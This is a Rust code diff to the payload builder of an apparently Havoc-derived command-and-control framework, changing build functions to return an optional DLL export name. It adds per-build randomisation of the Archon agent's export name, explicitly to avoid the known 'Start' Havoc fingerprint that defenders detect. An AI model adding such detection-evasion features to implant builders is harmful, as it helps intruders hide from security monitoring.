@@ -14,7 +14,7 @@ use red_cell_common::ListenerConfig;
 
 use super::build_defs::{
     archon_ecdh_defines, build_defines, build_stager_defines, default_compiler_flags,
-    generate_archon_magic, main_args, stager_cache_bytes,
+    generate_archon_export_name, generate_archon_magic, main_args, stager_cache_bytes,
 };
 use super::cache::compute_cache_key;
 use super::compiler::{asm_sources, c_sources, run_command};
@@ -37,7 +37,7 @@ impl PayloadBuilderService {
         compile_dir: &Path,
         ecdh_pub_key: Option<[u8; 32]>,
         progress: &mut F,
-    ) -> Result<Vec<u8>, PayloadBuildError>
+    ) -> Result<(Vec<u8>, Option<String>), PayloadBuildError>
     where
         F: FnMut(BuildProgress),
     {
@@ -46,7 +46,7 @@ impl PayloadBuilderService {
                 level: "Info".to_owned(),
                 message: "compiling core dll".to_owned(),
             });
-            let dll_bytes = self
+            let (dll_bytes, _) = self
                 .compile_portable_executable(
                     listener,
                     architecture,
@@ -80,7 +80,8 @@ impl PayloadBuilderService {
                 level: "Good".to_owned(),
                 message: "payload generated".to_owned(),
             });
-            return Ok(shellcode);
+            // Shellcode is loaded via DllMain, not the named export — export name not needed.
+            return Ok((shellcode, None));
         }
 
         if format == OutputFormat::RawShellcode {
@@ -96,7 +97,7 @@ impl PayloadBuilderService {
                 level: "Info".to_owned(),
                 message: "compiling core dll for raw shellcode".to_owned(),
             });
-            let dll_bytes = self
+            let (dll_bytes, _) = self
                 .compile_portable_executable(
                     listener,
                     architecture,
@@ -126,10 +127,11 @@ impl PayloadBuilderService {
                 level: "Good".to_owned(),
                 message: "payload generated".to_owned(),
             });
-            return Ok(shellcode);
+            // DllLdr loads via DllMain — export name not needed by callers.
+            return Ok((shellcode, None));
         }
 
-        let bytes = self
+        let (bytes, export_name) = self
             .compile_portable_executable(
                 listener,
                 architecture,
@@ -146,7 +148,7 @@ impl PayloadBuilderService {
             level: "Good".to_owned(),
             message: "payload generated".to_owned(),
         });
-        Ok(bytes)
+        Ok((bytes, export_name))
     }
 
     #[allow(clippy::too_many_arguments)]
@@ -161,7 +163,7 @@ impl PayloadBuilderService {
         shellcode_define: bool,
         ecdh_pub_key: Option<[u8; 32]>,
         progress: &mut F,
-    ) -> Result<Vec<u8>, PayloadBuildError>
+    ) -> Result<(Vec<u8>, Option<String>), PayloadBuildError>
     where
         F: FnMut(BuildProgress),
     {
@@ -178,9 +180,17 @@ impl PayloadBuilderService {
             format.file_extension()
         ));
         let mut defines = build_defines(listener, config_bytes.as_slice(), shellcode_define)?;
+        let mut export_name: Option<String> = None;
         if agent.name == "archon" {
             let (magic_define, _magic_value) = generate_archon_magic()?;
             defines.push(magic_define);
+            // Randomize the DLL export name for every Archon DLL/ReflectiveDll build so
+            // that no two binaries share the known "Start" Havoc fingerprint.
+            if matches!(format, OutputFormat::Dll | OutputFormat::ReflectiveDll) {
+                let (export_define, name) = generate_archon_export_name()?;
+                defines.push(export_define);
+                export_name = Some(name);
+            }
             if let Some(pub_key) = ecdh_pub_key {
                 defines.extend(archon_ecdh_defines(&pub_key)?);
             }
@@ -230,7 +240,7 @@ impl PayloadBuilderService {
         if let Some(binary_patch) = &self.inner.binary_patch {
             payload = patch_payload(payload, architecture, binary_patch)?;
         }
-        Ok(payload)
+        Ok((payload, export_name))
     }
 
     async fn compile_asm_objects<F>(
@@ -316,7 +326,12 @@ impl PayloadBuilderService {
                 architecture.suffix(),
                 OutputFormat::StagedShellcode.file_extension()
             );
-            return Ok(PayloadArtifact { bytes: cached, file_name, format: format_str.to_owned() });
+            return Ok(PayloadArtifact {
+                bytes: cached,
+                file_name,
+                format: format_str.to_owned(),
+                export_name: None,
+            });
         }
 
         progress(BuildProgress {
@@ -335,7 +350,12 @@ impl PayloadBuilderService {
 
         self.inner.cache.put(&cache_key, &compiled).await;
 
-        Ok(PayloadArtifact { bytes: compiled, file_name, format: format_str.to_owned() })
+        Ok(PayloadArtifact {
+            bytes: compiled,
+            file_name,
+            format: format_str.to_owned(),
+            export_name: None,
+        })
     }
 
     /// Compile the staged shellcode stager from `payloads/templates/MainStager.c`.
